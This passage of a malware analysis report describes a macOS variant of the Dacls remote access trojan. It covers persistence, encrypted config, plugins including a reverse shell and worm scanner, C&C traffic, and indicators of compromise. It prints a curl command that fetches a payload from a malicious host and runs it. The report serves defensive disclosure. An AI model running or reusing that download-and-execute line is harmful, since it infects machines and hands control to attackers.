Similar to the Linux variant, it\nboasts a variety of features including command execution, file management, traffic proxying\nand worm scanning.\n\n### Discovery\n\nOn April 8th, a suspicious Mac application named “TinkaOTP” was [submitted to VirusTotal](https://www.virustotal.com/gui/file/899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53/submissions)\nfrom Hong Kong. It was not detected by any engines at the time.\n\n\n-----\n\nThe malicious bot executable is located in Contents/Resources/Base.lproj/ directory of the\napplication and pretends to be a nib file (“SubMenu.nib”) while it’s a Mac executable file. It\ncontained the strings “c_2910.cls” and “k_3872.cls” which are the names of certificate and\nprivate key files that had been previously observed.\n\n### Persistence\n\nThis RAT persists through LaunchDaemons or LaunchAgents which take a property list (plist)\nfile that specifies the application that needs to be executed after reboot. The difference\nbetween LaunchAgents and LaunchDaemons is that LaunchAgents run code on behalf of\nthe logged-in user while LaunchDaemon run code as root user.\n\nWhen the malicious application starts, it creates a plist file with the “com.aex-loop.agent.plist”\nname under the “Library/LaunchDaemons” directory. The content of the plist file is hardcoded\nwithin the application.\n\nThe program also checks if “getpwuid( getuid())” returns the user id of the current process. If\na user id is returned, it creates the plist file “com.aex-loop.agent.plist” under the\nLaunchAgents directory: “Library/LaunchAgents/”.\n\nFigure 1: Plist file\nThe file name and directory to store the plist are in hex format and appended together. They\nshow the filename and directory backwards.\n\nFigure\n\n2: Directory and file name generation\n\n### Config File\n\n\n-----\n\nThe config file contains the information about the victim s machine such as Puid, Pwuid,\nplugins and C&C servers. The contents of the config file are encrypted using the AES\nencryption algorithm.\n\nFigure 3: Load config\nBoth Mac and Linux variants use the same AES key and IV to encrypt and decrypt the\nconfig file. The AES mode in both variants is CBC.\n\n\n-----\n\nFigure 4: AES Key and IV\nThe config file location and name are stored in hex format within the code. The name of the\nconfig file pretends to be a database file related to the Apple Store:\n\n“Library/Caches/Com.apple.appstore.db”\n\nFigure\n\n5: Config file name\nThe “IntializeConfiguration” function initializes the config file with the following hardcoded\nC&C servers.\n\n\n-----\n\nFigure 6: Initialize config file\nThe config file is constantly updated by receiving commands from the C&C server. The\n[application name after installation is “mina”. Mina comes from the MinaOTP application](https://github.com/MinaOTP/MinaOTP-MAC)\nwhich is a two-factor authentication app for macOS.\n\nFigure 7:\n\nConfig file is being updated\n\n### Main Loop\n\n\n-----\n\nAfter initializing the config file, the main loop is executed to perform the following four main\ncommands:\n\nUpload C&C server information from the config file to the server (0x601)\nDownload the config file contents from the server and update the config file (0x602)\nUpload collected information from the victim’s machine by calling “getbasicinfo” function\n(0x700)\nSend heartbeat information (0x900)\n\nThe command codes are exactly the same as Linux.dacls.\n\n\n-----\n\nFigure 8: Main Loop\n\n### Plugins\n\nThis Mac RAT has all the six plugins seen in the Linux variant with an additional plugin\nnamed “SOCKS”. This new plugin is used to proxy network traffic from the victim to the C&C\nserver.\n\n\n-----\n\nThe app loads all the seven plugins at the start of the main loop. Each plugin has its own\nconfiguration section in the config file which will be loaded at the initialization of the plugin.\n\nFigure 9:\n\nPlugins loaded\n\n**CMD plugin**\n\nThe cmd plugin is similar to the “bash” plugin in the Linux rat which receives and executes\ncommands by providing a reverse shell to the C&C server.\n\nFigure\n\n10: Cmd Plugin\n\n**File Plugin**\n\n\n-----\n\nThe file plugin has the capability to read, delete, download, and search files within a\ndirectory. The only difference between the Mac and Linux version is that the Mac version\ndoes not have the capability to write files (Case 0).\n\nFigure\n\n11: File plugin\n\n**Process plugin**\n\nThe process plugin has the capability of killing, running, getting process ID and collecting\nprocess information.\n\nFigure\n\n12: Process Plugin\nIf the “/proc/%d/task” directory of a process is accessible, the plugin obtains the following\ninformation from the process where %d is the process ID:\n\nCommand line arguments of the process by executing “/proc/ %/cmdline”\nName, Uid, Gid, PPid of the process from the “/proc/%d/status” file.\n\n\n-----\n\n**Test plugin**\n\nThe code for the Test plugin between Mac and Linux variant is the same. It checks the\nconnection to an IP and Port specified by the C&C servers.\n\n**RP2P plugin**\n\nThe RP2P plugin is a proxy server used to avoid direct communications from the victim to\nthe actor’s infrastructure.\n\nFigure\n\n13: Reverse P2P\n\n**LogSend plugin**\n\nThe Logsend plugin contains three modules that:\n\nCheck connection to the Log server\nScan network (worm scanner module)\nExecute long run system commands\n\n\n-----\n\nFigure 14: Logsend Plugin\nThis plugin sends the collected logs using HTTP post requests.\n\nFigure 15: User Agent\nAn interesting function in this plugin is the worm scanner. The “start_worm_scan” can scan a\nnetwork subnet on ports 8291 or 8292. The subnet that gets scanned is determined based\non a set of predefined rules. The following diagram shows the process of selecting the\nsubnet to scan.\n\n\n-----\n\nFigure\n\n16: Worm Scan\n\n**Socks plugin**\n\nThe Socks plugin is the new, seventh plugin added to this Mac Rat. It is similar to the RP2P\nplugin and acts as an intermediary to direct the traffic between bot and C&C infrastructure. It\nuses Socks4 for its proxy communications.\n\n\n-----\n\nFigure 17:\n\nSocks4\n\n### Network Communications\n\nC&C communication used by This Mac RAT is similar to the Linux variant. To connect to the\nserver, the application first establishes a TLS connection and then performs beaconing and\nfinally encrypts the data sent over SSL using the RC4 algorithm.\n\n\n-----\n\nFigure 18: Traffic generated by the Application (.mina)\n\nFigure 19: TLS connection\nBoth Mac and Linux variants use the WolfSSL library for SSL communications. WolfSSL is\nan open-source implementation of TLS in C that supports multiple platforms. This library has\nbeen used by several threat actors. For example, Tropic Trooper used this library in its\n\n\n-----\n\n[Keyboys malware.](https://www.pwc.co.uk/issues/cyber-security-data-privacy/research/the-keyboys-are-back-in-town.html)\n\nFigure\n\n20: WolfSSL\nThe command codes used for beaconing are the same as the codes used in Linux.dacls.\nThis is to confirm the identity of the bot and the server.\n\n\n-----\n\nThe RC4 key is generated by using a hard-coded key.\n\nInitialization\n\n## Variants and detection\n\n\nFigure 21: Beconing\n\nFigure 22: RC4\n\n\n-----\n\nWe also identified another variant of this RAT which downloads the malicious payload using\nthe following curl command:\n\n_curl -k -o ~/Library/.mina https://loneeaglerecords.com/wp-_\n_content/uploads/2020/01/images.tgz.001 > /dev/null 2>&1 && chmod +x ~/Library/.mina >_\n_/dev/null 2>&1 && ~/Library/.mina > /dev_\n\nWe believe this Mac variant of the Dcals RAT is associated with the Lazarus group, also\nknown as Hidden Cobra and APT 38, an infamous North Korean threat actor performing\ncyber espionage and cyber-crime operations since 2009.\n\nThe group is known to be one of the most sophisticated actors, capable of making custom\nmalware to target different platforms. The discovery of this Mac RAT shows that this APT\ngroup is constantly developing its malware toolset.\n\nMalwarebytes for Mac detects this remote administration Trojan as OSX-DaclsRAT.\n\n\n-----\n\n## IOCs\n```\n899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53\n846d8647d27a0d729df40b13a644f3bffdc95f6d0e600f2195c85628d59f1dc6\n216a83e54cac48a75b7e071d0262d98739c840fd8cd6d0b48a9c166b69acd57d\nd3235a29d254d0b73ff8b5445c962cd3b841f487469d60a02819c0eb347111dd\nd3235a29d254d0b73ff8b5445c962cd3b841f487469d60a02819c0eb347111dd\nloneeaglerecords[.]com/wp-content/uploads/2020/01/images.tgz.001\n67.43.239.146\n185.62.58.207\n50.87.144.227\n\n```\n\n-----",
